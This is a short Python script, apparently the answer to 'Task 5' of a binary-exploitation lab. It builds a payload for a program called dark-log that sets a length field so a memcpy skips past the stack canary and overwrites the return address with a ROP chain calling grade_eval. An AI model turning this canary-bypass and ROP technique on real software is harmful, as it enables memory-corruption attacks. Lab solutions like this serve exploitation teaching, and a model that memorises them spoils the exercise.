#!/usr/bin/env python3
"""Task 5: bypass the stack canary in dark-log via f.len and memcpy."""
import struct
import sys

# Same kind of unaligned gadget as in payload_rop.py:
#   0x4018a2: 41 5f   pop r15
#   0x4018a4: c3      ret
POP_RDI_RET = 0x4018A3
RET = 0x4018A4
GRADE_EVAL = 0x401677

# dark-log's input() copies f.expression (128 bytes) to f.logMsg + f.len.
# The struct layout is:
#   rbp-0x120  f.expression[128]
#   rbp-0x0a0  f.logMsg[128]
#   rbp-0x020  f.len
#   rbp-0x008  canary
# Setting f.len = 0xa8 makes the destination rbp-0xa0 + 0xa8 = rbp+8, i.e.
# the saved return address.  The copy then lands above the canary instead of
# crossing it, so the canary check still passes.
chain = (
    struct.pack("<Q", POP_RDI_RET)
    + struct.pack("<Q", 4)          # rdi = 4
    + struct.pack("<Q", RET)        # align rsp for grade_eval
    + struct.pack("<Q", GRADE_EVAL)
)
source = chain + b"A" * (128 - len(chain))   # f.expression, copied to rbp+8
filler = b"B" * 128                          # f.logMsg
length = struct.pack("<I", 0xA8)             # f.len = 168

payload = source + filler + length

assert len(payload) == 260          # does not reach the canary at offset 280
assert b"\n" not in payload

sys.stdout.buffer.write(payload)
